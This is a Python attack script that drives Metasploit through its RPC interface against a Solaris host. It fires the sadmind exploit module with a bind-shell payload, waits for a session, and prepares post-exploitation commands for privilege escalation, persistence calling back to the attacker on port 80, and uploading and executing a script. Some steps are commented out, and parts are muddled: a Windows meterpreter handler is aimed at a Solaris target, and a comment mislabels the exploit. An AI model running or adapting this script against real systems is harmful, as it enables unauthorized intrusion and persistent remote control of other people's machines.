#!/usr/bin/env python3
import os
import optparse
import sys
from time import sleep
from pymetasploit3.msfrpc import MsfRpcClient

# Function to create the MSF .rc files
def builder(RHOST, LHOST, LPORT):
    with open('/tmp/smbpost.rc', 'w') as post, open('/tmp/soltel_install.sh', 'w') as bat:
        postcomms = f"""getsystem
run persistence -S -U -X -i 10 -p 80 -r {LHOST}
cd /
upload /tmp/soltel_install.sh /tmp
execute -f soltel_install.sh
    """
        batcomm = "soltel_install.sh /quiet"
        #post.write(postcomms); bat.write(batcomm)

# Sets up the chain of rc files to exploit Solaris telnet bypass, setup persistence, etc.
def sploiter(RHOST, LHOST, LPORT, session):
    #client = MsfRpcClient('abc123', ssl=True)
    client = MsfRpcClient('abc123', server='127.0.0.1', port=55552) # Replace with actual password if needed

    # Exploit Telnet Bypass
    exploit = client.modules.use('exploit', 'solaris/sunrpc/sadmind_adm_build_path')
    exploit['RHOSTS'] = RHOST
    exploit['LHOST'] = LHOST
    exploit['LPORT'] = LPORT
    exploit['TARGET'] = 1
    payload = client.modules.use('payload', 'solaris/x86/shell_bind_tcp')
    exploit.execute(payload=payload)
    
    print(f"[+] Exploiting Solaris sadmind on: {RHOST}")

    # Wait for the exploit to complete and check for a session
    while client.sessions.list == {}:
        sleep(5)

    print("[+] Session created!")

    # Run Post-exploit script (commented out, uncomment if needed)
    # post_exploit = client.modules.use('post', 'multi/gather/run_console_rc_file')
    # post_exploit['SESSION'] = session
    # post_exploit['RESOURCE'] = '/tmp/smbpost.rc'
    # post_exploit.execute()

    # Setup Listener for persistent connection back over port 80 (commented out, uncomment if needed)
    # sleep(10)
    # handler = client.modules.use('exploit', 'multi/handler')
    # handler['PAYLOAD'] = 'windows/meterpreter/reverse_tcp'
    # handler['LHOST'] = LHOST
    # handler['LPORT'] = 80
    # handler.execute()
    # print(f"[+] Setting up listener on: {LHOST}:80")

def main():
    parser = optparse.OptionParser(sys.argv[0] +
    ' -p LPORT -r RHOST -l LHOST')
    parser.add_option('-p', dest='LPORT', type='string', 
    help='Specify a port to listen on')
    parser.add_option('-r', dest='RHOST', type='string', 
    help='Specify a remote host')
    parser.add_option('-l', dest='LHOST', type='string', 
    help='Specify a local host')
    parser.add_option('-s', dest='session', type='string', 
    help='Specify a session ID')
    (options, args) = parser.parse_args()
    session = options.session
    RHOST = options.RHOST
    LHOST = options.LHOST
    LPORT = options.LPORT

    if RHOST is None or LPORT is None or LHOST is None:
        print(parser.usage)
        sys.exit(0)

    builder(RHOST, LHOST, LPORT)
    sploiter(RHOST, LHOST, LPORT, session)

if __name__ == "__main__":
    main()
